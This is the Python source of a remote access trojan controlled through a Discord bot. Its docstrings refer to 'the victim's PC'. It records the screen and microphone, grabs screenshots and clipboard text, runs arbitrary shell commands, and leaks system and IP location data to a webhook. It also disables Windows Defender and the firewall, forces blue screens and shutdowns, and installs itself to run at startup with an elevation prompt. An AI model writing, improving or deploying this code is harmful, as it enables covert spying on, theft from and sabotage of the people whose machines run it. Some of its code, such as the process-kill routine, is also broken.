import disnake
from disnake.ext import commands
from PIL import ImageGrab
from io import BytesIO
import subprocess
import datetime
from datetime import datetime
import psutil, platform
import pyaudio
import wave
import cv2
import pyaudio
import os
import pyautogui
import cv2
import numpy as np
# Initialize the bot
bot = commands.Bot(command_prefix="!", intents=disnake.Intents.all())
# bot.remove_command("!help")


# Define your Webhook URL and Bot Token
WEBHOOK = "WEBHOOK_LINK_HERE"
TOKEN = "BOT_TOKEN_HERE"

# Function to style text for logging
def style_text(text, level="INFO"):
    """Style the text to be more readable and to give more info"""
    current_time = datetime.now().strftime("%H:%M - %d/%m")
    if level == "ERROR":
        return f"[ ! ] - {current_time} Error: {text}"
    else:
        return f"[ * ] {current_time} INFO: {text}"


@bot.command()
async def video(ctx, duration: int = 10):
    """Record a video using cv2 and numpy"""
    await ctx.send(style_text(f"Recording screen for {duration} seconds..."))

    # Get the screen size using pyautogui
    screen_width, screen_height = pyautogui.size()

    # Define the codec and create a VideoWriter object
    fourcc = cv2.VideoWriter_fourcc(*"mp4v")
    out = cv2.VideoWriter("output.mp4", fourcc, 20.0, (screen_width, screen_height))

    # Recording duration in seconds
    for _ in range(int(20 * duration)):  # Adjust the multiplier for frames per second
        screenshot = pyautogui.screenshot()
        frame = np.array(screenshot)
        frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
        out.write(frame)

    # Release the VideoWriter and destroy all OpenCV windows
    out.release()
    cv2.destroyAllWindows()

    # Notify the user that recording is finished and send the file
    await ctx.send(style_text("Screen recording finished."))
    await ctx.send(file=disnake.File("output.mp4"))

    # Clean up temporary files
    os.remove("output.mp4")


@bot.command()
async def audio(ctx, *, seconds):
    """Record audio from the input of the device"""
    try:
        FORMAT = pyaudio.paInt16
        CHANNELS = 1
        RATE = 44100
        CHUNK = 1024
        RECORD_SECONDS = int(seconds) if seconds.isdigit() else 15
        OUTPUT_FILENAME = "output.wav"

        # Initialize PyAudio
        audio = pyaudio.PyAudio()

        # Create an input stream
        stream = audio.open(
            format=FORMAT,
            channels=CHANNELS,
            rate=RATE,
            input=True,
            frames_per_buffer=CHUNK,
        )

        msg: disnake.Message = await ctx.send(style_text("Recording..."))

        frames = []

        # Record audio for the specified duration
        for i in range(0, int(RATE / CHUNK * RECORD_SECONDS)):
            data = stream.read(CHUNK)
            frames.append(data)

        stream.stop_stream()
        stream.close()

        # Terminate PyAudio
        audio.terminate()

        # Save the recorded audio to a WAV file
        with wave.open(OUTPUT_FILENAME, "wb") as wf:
            wf.setnchannels(CHANNELS)
            wf.setsampwidth(audio.get_sample_size(FORMAT))
            wf.setframerate(RATE)
            wf.writeframes(b"".join(frames))

        await msg.edit(file=disnake.File(OUTPUT_FILENAME))
        os.remove(OUTPUT_FILENAME)
        await ctx.send(os.getcwd())
    except Exception as e:
        await ctx.send(style_text(f"An error occurred: {str(e)}", level="ERROR"))


@bot.command()
async def systeminfo(ctx):
    """Gather system information"""
    # Get basic system information
    system_info = f"**System Information**\n"
    system_info += f"Operating System: {platform.system()} {platform.release()}\n"
    system_info += f"Machine: {platform.machine()}\n"

    # Check if the system is a laptop (specific to Linux)
    is_laptop = False
    if platform.system() == "Linux":
        try:
            with open("/sys/class/power_supply/BAT0/present", "r") as file:
                is_laptop = file.read().strip() == "1"
        except FileNotFoundError:
            is_laptop = False

    if is_laptop:
        system_info += "Device Type: Laptop\n"
    else:
        system_info += "Device Type: Desktop\n"

    # Get CPU information
    cpu_info = f"**CPU Information**\n"
    cpu_info += f"CPU Cores: {psutil.cpu_count(logical=False)} physical, {psutil.cpu_count(logical=True)} logical\n"

    # Get memory information
    memory_info = f"**Memory Information**\n"
    virtual_memory = psutil.virtual_memory()
    memory_info += f"Total Memory: {convert_bytes(virtual_memory.total)}\n"
    memory_info += f"Available Memory: {convert_bytes(virtual_memory.available)}\n"

    # Get disk information
    disk_info = f"**Disk Information**\n"
    partitions = psutil.disk_partitions()
    for partition in partitions:
        usage = psutil.disk_usage(partition.mountpoint)
        disk_info += f"Partition: {partition.device} - Total: {convert_bytes(usage.total)}, Used: {convert_bytes(usage.used)}  \n"

    message = f"{system_info}\n{cpu_info}\n{memory_info}\n{disk_info}"
    await ctx.send(f"```{message}```")


def convert_bytes(bytes):
    """
    Converts bytes into kilobytes, megabytes and so on
    """
    if bytes < 1024:
        return f"{bytes} B"
    elif bytes < 1024**2:
        return f"{bytes / 1024:.2f} KB"
    elif bytes < 1024**3:
        return f"{bytes / (1024 ** 2):.2f} MB"
    else:
        return f"{bytes / (1024 ** 3):.2f} GB"


@bot.command()
async def screenshot(ctx):
    """Take a screenshot of the victim's primary screen"""
    # Take a screenshot of the primary display
    screenshot = ImageGrab.grab()

    # Save the screenshot as a BytesIO object
    screenshot_bytes = BytesIO()
    screenshot.save(screenshot_bytes, format="PNG")
    screenshot_bytes.seek(0)

    # Send the screenshot to the current channel
    await ctx.send(file=disnake.File(screenshot_bytes, filename="screenshot.png"))


@bot.command()
async def execute(ctx, *, command):
    """Execute a CMD command in background"""
    try:
        # Run the command in the background and capture the output
        result = subprocess.check_output(
            command, shell=True, stderr=subprocess.STDOUT, text=True
        )

        # Send the result back to the Discord channel
        await ctx.send(style_text(f"Command executed successfully:\n```\n{result}```"))
    except subprocess.CalledProcessError as e:
        # If the command returns a non-zero exit code, capture the error and send it as a message
        await ctx.send(
            style_text(f"Command failed with error:\n```\n{e.output}```", level="ERROR")
        )
    except Exception as e:
        # Handle any other exceptions that may occur
        await ctx.send(style_text(f"An error occurred: {str(e)}", level="ERROR"))


import ctypes
from comtypes import CLSCTX_ALL

from ctypes.wintypes import *
from ctypes import *


@bot.command()
async def clipboard(ctx):
    """Send the latest thing the user copied to the clipboard, doesn't handle images or files..."""
    CF_TEXT = 1
    kernel32 = ctypes.windll.kernel32
    kernel32.GlobalLock.argtypes = [ctypes.c_void_p]
    kernel32.GlobalLock.restype = ctypes.c_void_p
    kernel32.GlobalUnlock.argtypes = [ctypes.c_void_p]
    user32 = ctypes.windll.user32
    user32.GetClipboardData.restype = ctypes.c_void_p
    user32.OpenClipboard(0)
    if user32.IsClipboardFormatAvailable(CF_TEXT):
        data = user32.GetClipboardData(CF_TEXT)
        data_locked = kernel32.GlobalLock(data)
        text = ctypes.c_char_p(data_locked)
        value = text.value
        kernel32.GlobalUnlock(data_locked)
        user32.CloseClipboard()
        body = value.decode()
        await ctx.send(style_text(f"Clipboard content is: {body}"))
    else:
        await ctx.send(
            style_text(
                "No text data found on the clipboard or image or file.", level="ERROR"
            )
        )


import requests


@bot.event
async def on_ready():
    print(style_text(f"Logged in as {bot.user.name} ({bot.user.id})"))
    await send_webhook_message("Bot Online")


async def send_webhook_message(message):
    """Sends a webhook message from the 'WEBHOOK' constant"""
    data = {"content": message}
    response = requests.post(WEBHOOK, json=data)


@bot.command()
async def ipinfo(ctx):
    """Gathers IP Address and other IP related info"""
    try:
        # Get the public IP address of your PC
        response = requests.get("https://ipinfo.io")
        data = response.json()

        ip = data.get("ip", "Unknown")
        city = data.get("city", "Unknown")
        region = data.get("region", "Unknown")
        country = data.get("country", "Unknown")
        location = data.get("loc", "Unknown")

        # Create a message with the IP address and geolocation info
        message = style_text(f"\[\*\] IP Address: {ip}\n")
        message += style_text(f"\[\*\] Location: {city}, {region}, {country}\n")
        message += style_text(f"\[\\*] Coordinates: {location}")
        message += style_text(f" Coordinates Might not be precise.")

        await ctx.send(message)

    except Exception as e:
        await ctx.send(style_text(f"An error occurred: {str(e)}", level="ERROR"))


async def executed(ctx):
    """Shorten version to say that a command was executed"""
    return await ctx.send(style_text("Command Successfully Executed."))


@bot.command()
async def shutdown(ctx):
    """Shutdown the victim's PC"""
    os.popen("shutdown /p ")
    await executed(ctx)


@bot.command()
async def restart(ctx):
    """Restarts the victim's pc"""
    os.popen("shutdown /r /t 80")
    await executed(ctx)


@bot.command()
async def logoff(ctx):
    """Logs Off the current user from the victim's pc"""
    os.popen("shutdown /l /f")
    await executed(ctx)


@bot.command()
async def bluescreen(ctx):
    """Emulates a windows hard error to make a blue screen"""
    ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
    ctypes.windll.ntdll.NtRaiseHardError(
        0xC0000022, 0, 0, 0, 6, ctypes.byref(ctypes.wintypes.DWORD())
    )
    await executed(ctx)


@bot.command()
async def processes(ctx):
    """Shows the processes that are running"""
    result = os.popen("tasklist").read()
    result_chunks = [
        result[i : i + 1900] for i in range(0, len(result), 1900)
    ]  # Split into chunks of 2000 characters

    if not result_chunks:
        await ctx.send("[!] Command not recognized or no output was obtained")
    else:
        for chunk in result_chunks:
            await ctx.send(f"```{chunk}```")


@bot.command()
async def killproc(ctx, *, proc: str):
    """kills a process by its PID  (process id) or by it's name"""
    if proc.lower().startswith("pid"):
        cmd = r"taskkill /PID " + proc.lower().split("pid-")
        os.popen(cmd)
        call = r'tasklist /FI "PID eq' + proc.lower().split("pid-") + f'"'
        output = subprocess.check_output(call).decode()
        last_line = output.strip().split("\r\n")[-1]
        await executed(ctx)
    elif proc.lower().startswith("im"):
        cmd = r"taskkill /IM " + proc.lower().split("im-")
        os.popen(cmd)
        call = r'tasklist /FI "imagename eq' + proc.lower().split("im-") + f'"'
        output = subprocess.check_output(call).decode()
        last_line = output.strip().split("\r\n")[-1]
        done = last_line.lower().startswith(proc.lower().split("im-"))
        await executed(ctx)
    else:
        return await ctx.send(
            "COMMAND EXAMPLES: \n Kill with PI !killproc pid-1234 \n Kill with IM !killproc im-python.exe"
        )


@bot.command()
async def disableav(ctx):
    """Disables the AntiVirus by using 2 different methods"""
    is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
    if is_admin == True:
        cmd = """ REG QUERY "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion" | findstr /I /C:"CurrentBuildnumber"  """

        output = subprocess.run(
            cmd,
            stdout=subprocess.PIPE,
            shell=True,
            stderr=subprocess.PIPE,
            stdin=subprocess.PIPE,
        ).stdout.decode("CP437")
        success = output.split()
        success = success[2:]
        if success <= ["17763"]:
            os.popen(
                r"Dism /online /Disable-Feature /FeatureName:Windows-Defender /Remove /NoRestart /quiet)"
            )
            await ctx.send("Success disabling AV")
        elif success <= ["18362"]:
            os.popen(r"""powershell Add-MpPreference -ExclusionPath "C:\\" """)
            await ctx.send("Added Exclusion to the AV so it doesnt work in C: drive")
        else:
            await ctx.send(style_text("An error occurred.", level="ERROR"))
    else:
        await ctx.send("You don't have admin privileges.")


@bot.command()
async def disablefirewall(ctx):
    """Disables firewall from the pc"""
    is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
    if is_admin == True:
        os.popen(r"NetSh Advfirewall set allprofiles state off")
        await ctx.send("Disabled Firewall.")
    else:
        await ctx.send("You don't have admin privileges.")


import sys


@bot.command()
async def startup(ctx):
    """Puts the RAT on startup"""

    try:
        path = sys.argv[0]
        isexe = False
        if sys.argv[0].endswith("exe"):
            isexe = True
        if isexe:
            os.popen(
                rf'copy "{path}" "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" /Y'
            )
        else:
            os.popen(
                r'copy "{}" "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs" /Y'.format(
                    path
                )
            )
            e = r"""
        Set objShell = WScript.CreateObject("WScript.Shell")
        objShell.Run "cmd /c cd C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\ && python {}", 0, True
        """.format(
                os.path.basename(sys.argv[0])
            )
            with open(
                r"C:\Users\{}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\startup.vbs".format(
                    os.getenv("USERNAME")
                ),
                "w",
            ) as f:
                f.write(e)
                f.close()
            await executed(ctx)
    except:
        await ctx.send("This command requires admin privileges")

# Check if the script is running with admin privileges
if __name__ == "__main__":
    if ctypes.windll.shell32.IsUserAnAdmin():
        print("Running with admin privileges.")
    else:

        try:
            payload = f"python {sys.argv[1]}"
            powershell_command = (
                "Start-Process 'cmd' -Verb runas -ArgumentList '/c " + payload + "'"
            )
            subprocess.run(
                ["powershell.exe", "-Command", powershell_command], shell=True
            )
            bot.run(
                TOKEN
            )
        except Exception as e:
            pass
